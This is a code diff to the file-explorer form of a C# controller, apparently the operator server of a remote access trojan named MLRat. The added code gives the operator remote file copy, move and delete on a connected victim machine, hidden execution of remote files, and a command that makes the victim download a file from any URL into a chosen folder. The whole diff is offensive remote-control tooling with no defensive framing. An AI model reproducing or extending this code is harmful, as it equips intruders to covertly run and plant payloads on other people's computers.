@@ -1,4 +1,5 @@
-﻿using MLManagementServer.Handlers;
+﻿using MLManagementServer.CustomObjects;
+using MLManagementServer.Handlers;
 using MLRat.Server;
 using SharedCode.Network;
 using System;
@@ -6,6 +7,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -17,6 +19,8 @@ namespace MLManagementServer.Forms
     {
         public IClient Client { get; set; }
         string CurrentDirectory = string.Empty;
+        Dictionary<Guid, FileBucketInfo> BucketHandler = new Dictionary<Guid, FileBucketInfo>();
+        formFileProperties FilePropertyForm = null;
         public FileExplorerForm(IServerUIHandler UIHandler, IClient c)
         {
             Client = c;
@@ -36,6 +40,7 @@ namespace MLManagementServer.Forms
             if(uiError != null)
                 images.Images.Add("Error", uiError);
             lvFileView.SmallImageList = images;
+            lvFileBucket.SmallImageList = images;
             c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, string.Empty);
         }
 
@@ -134,9 +139,9 @@ namespace MLManagementServer.Forms
                     else
                     {
 
-                        if (!CurrentDirectory.EndsWith("\\") && CurrentDirectory != string.Empty)
-                            CurrentDirectory += "\\";
-                        CurrentDirectory += path;
+                       // if (!CurrentDirectory.EndsWith("\\") && CurrentDirectory != string.Empty)
+                       //     CurrentDirectory += "\\";
+                        CurrentDirectory = Path.Combine(CurrentDirectory, path);
                         if (string.IsNullOrWhiteSpace(CurrentDirectory))
                             CurrentDirectory = string.Empty;
                     }
@@ -166,12 +171,282 @@ namespace MLManagementServer.Forms
                 ListViewItem i = lvFileView.SelectedItems[0];
                 if (i.ImageKey != "File")
                     return;
-                string rPath = CurrentDirectory;
-                if (!rPath.EndsWith("\\"))
-                    rPath += "\\";
-                rPath += i.Text;
+                string rPath = Path.Combine(CurrentDirectory, i.Text);
                 FileExplorerHandler.StartDownload(Client, rPath);
             }
+        }
+
+        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach(ListViewItem i in lvFileView.SelectedItems)
+            {
+                if(i.ImageKey == "File")
+                {
+                    ListViewItem bi = new ListViewItem(i.Text);
+                    FileBucketInfo bucketInfo = new FileBucketInfo();
+                    bucketInfo.RemotePath = Path.Combine(CurrentDirectory, i.Text);
+                    bucketInfo.RenameTo = i.Text;
+                    bucketInfo.DisplayInfo = bi;
+                    bucketInfo.RemoteDirectory = CurrentDirectory;
+
+                    bi.SubItems.Add(bucketInfo.RenameTo);
+                    bi.SubItems.Add(bucketInfo.RemotePath);
+                    bi.SubItems.Add("...");
+                    bi.Tag = bucketInfo;
+                    bi.ImageKey = "File";
+                    lvFileBucket.Items.Add(bi);
+                    Guid id = Guid.NewGuid();
+                    while(BucketHandler.ContainsKey(id))
+                        id = Guid.NewGuid();
+                    bucketInfo.ID = id;
+                    BucketHandler.Add(id, bucketInfo);
+                }
+            }
+        }
+
+        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileBucket.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvFileBucket.SelectedItems[0];
+            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
+            if (bucketInfo.DoingOperation)
+                return;
+            using (formInput rename = new formInput("Rename", i.Text))
+            {
+                if (rename.ShowDialog() != DialogResult.OK)
+                    return;
+                bucketInfo.RenameTo = rename.InputText;
+            }
+            i.SubItems[1].Text = bucketInfo.RenameTo;
+        }
+
+        private void moveHereToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileBucket.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvFileBucket.SelectedItems[0];
+            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
+            if (bucketInfo.DoingOperation)
+                return;
+            if (bucketInfo.RemoteDirectory == CurrentDirectory)
+            {
+                MessageBox.Show("You are in the same directory.");
+                return;
+            }
+            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
+            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
+            bucketInfo.DoingOperation = true;
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.ForceMoveFile, bucketInfo.ID, bucketInfo.RemotePath, Path.Combine(CurrentDirectory, bucketInfo.RenameTo));
+            i.SubItems[3].Text = "Moving (Force)...";
+        }
+
+        private void removeFromBucketToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileBucket.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvFileBucket.SelectedItems[0];
+            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
+            if (bucketInfo.DoingOperation)
+                return;
+            if(MessageBox.Show(string.Format("Remove {0} from bucket?", i.Text), "Remove from bucket", MessageBoxButtons.YesNo) == DialogResult.Yes)
+            {
+                if(BucketHandler.ContainsKey(bucketInfo.ID))
+                    BucketHandler.Remove(bucketInfo.ID);
+                lvFileBucket.Items.Remove(i);
+            }
+        }
+
+        public void HandleMoveResponce(Guid id, bool success)
+        {
+            if(BucketHandler.ContainsKey(id))
+            {
+                Invoke((MethodInvoker)delegate ()
+                {
+                    FileBucketInfo info = BucketHandler[id];
+                    ListViewItem i = (ListViewItem)info.DisplayInfo;
+                    i.SubItems[3].Text = success ? "Moved Successfully." : "Failed to move.";
+                    info.DoingOperation = false;
+                    if (success)
+                    {
+                        info.RemotePath = info.RemoteDestination;
+                        info.RemoteDirectory = info.RemoteDestinationDirectory;
+                        i.SubItems[0].Text = info.RenameTo;
+                        i.SubItems[1].Text = info.RenameTo;
+                        i.SubItems[2].Text = info.RemotePath;
+
+                        if (info.RemoteDestinationDirectory == CurrentDirectory)
+                        {
+                            if (lvFileView.View == View.List)
+                                return;
+                            lvFileView.View = View.List;
+                            lvFileView.Items.Clear();
+                            lvFileView.Items.Add("Loading...");
+                            Console.WriteLine("Current directory: {0}", CurrentDirectory);
+                            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
+                        }
+                    }
+                });
+
+            }
+        }
+
+        public void HandleCopyResponce(Guid id, bool success)
+        {
+            if (BucketHandler.ContainsKey(id))
+            {
+                Invoke((MethodInvoker)delegate ()
+                {
+                    FileBucketInfo info = BucketHandler[id];
+                    ListViewItem i = (ListViewItem)info.DisplayInfo;
+                    i.SubItems[3].Text = success ? "Copied Successfully." : "Failed to copy.";
+                    info.DoingOperation = false;
+                    if (success && info.RemoteDestinationDirectory == CurrentDirectory)
+                    {
+                        if (lvFileView.View == View.List)
+                            return;
+                        lvFileView.View = View.List;
+                        lvFileView.Items.Clear();
+                        lvFileView.Items.Add("Loading...");
+                        Console.WriteLine("Current directory: {0}", CurrentDirectory);
+                        Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
+                    }
+                });
+            }
+        }
+
+        private void copyHereToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileBucket.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvFileBucket.SelectedItems[0];
+            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
+            if (bucketInfo.DoingOperation)
+                return;
+            if (bucketInfo.RemoteDirectory == CurrentDirectory)
+            {
+                MessageBox.Show("You are in the same directory.");
+                return;
+            }
+            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
+            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
+            bucketInfo.DoingOperation = true;
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.CopyFile, bucketInfo.ID, bucketInfo.RemotePath, bucketInfo.RemoteDestination);
+            i.SubItems[3].Text = "Copying...";
+        }
+
+        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+
+            if (lvFileBucket.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvFileBucket.SelectedItems[0];
+            FileBucketInfo bucketInfo = (FileBucketInfo)i.Tag;
+            if (bucketInfo.DoingOperation)
+                return;
+            if (bucketInfo.RemoteDirectory == CurrentDirectory)
+            {
+                MessageBox.Show("You are in the same directory.");
+                return;
+            }
+            bucketInfo.RemoteDestination = Path.Combine(CurrentDirectory, bucketInfo.RenameTo);
+            bucketInfo.RemoteDestinationDirectory = CurrentDirectory;
+            bucketInfo.DoingOperation = true;
+            Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.MoveFile, bucketInfo.ID, bucketInfo.RemotePath, bucketInfo.RemoteDestination);
+            i.SubItems[3].Text = "Moving...";
+        }
+
+        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.SelectedItems.Count > 0)
+            {
+                ListViewItem i = lvFileView.SelectedItems[0];
+                if (i.ImageKey != "File")
+                    return;
+                string rPath = Path.Combine(CurrentDirectory, i.Text);
+                if(MessageBox.Show(string.Format("Delete the file \"{0}\"? \nLocation: {1}", i.Text, rPath), "Delete File", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                {
+                    Client.Send((byte)NetworkCommand.DeleteFile, rPath);
+                }
+            }
+        }
+
+        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void normalToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.SelectedItems.Count > 0)
+            {
+                ListViewItem i = lvFileView.SelectedItems[0];
+                if (i.ImageKey != "File")
+                    return;
+                string rPath = Path.Combine(CurrentDirectory, i.Text);
+                Client.Send((byte)NetworkCommand.Execute, rPath);
+            }
+        }
+
+        private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.SelectedItems.Count > 0)
+            {
+                ListViewItem i = lvFileView.SelectedItems[0];
+                if (i.ImageKey != "File")
+                    return;
+                string rPath = Path.Combine(CurrentDirectory, i.Text);
+                Client.Send((byte)NetworkCommand.ExecuteHidden, rPath);
+            }
+        }
+
+        private void downloadFileToLocationToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void downloadFileHereToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (formDownloadFile dl = new formDownloadFile())
+            {
+                if (dl.ShowDialog() != DialogResult.OK)
+                    return;
+                Client.Send((byte)NetworkCommand.DownloadFile, dl.URL, Path.Combine(CurrentDirectory, dl.FileName));
+            }
+        }
+
+        public void HandleProperties(object[] data)
+        {
+            if (FilePropertyForm == null)
+                return;
+            FilePropertyForm.HandleData(data);
+        }
+
+        private void propertiesToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.SelectedItems.Count > 0)
+            {
+                ListViewItem i = lvFileView.SelectedItems[0];
+                if (i.ImageKey != "File")
+                    return;
+                string rPath = Path.Combine(CurrentDirectory, i.Text);
+                Guid id = Guid.NewGuid();
+                while (BucketHandler.ContainsKey(id))
+                    id = Guid.NewGuid();
+                BucketHandler.Add(id, null);
+                FilePropertyForm = new formFileProperties(id);
+                FilePropertyForm.FormClosed += FilePropertyForm_FormClosed;
+                Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.GetFileProperties, id, rPath);
+                FilePropertyForm.ShowDialog();
+                
+            }
+            
+        }
+
+        private void FilePropertyForm_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            formFileProperties f = (formFileProperties)sender;
+            f.Dispose();
         }
     }
 }
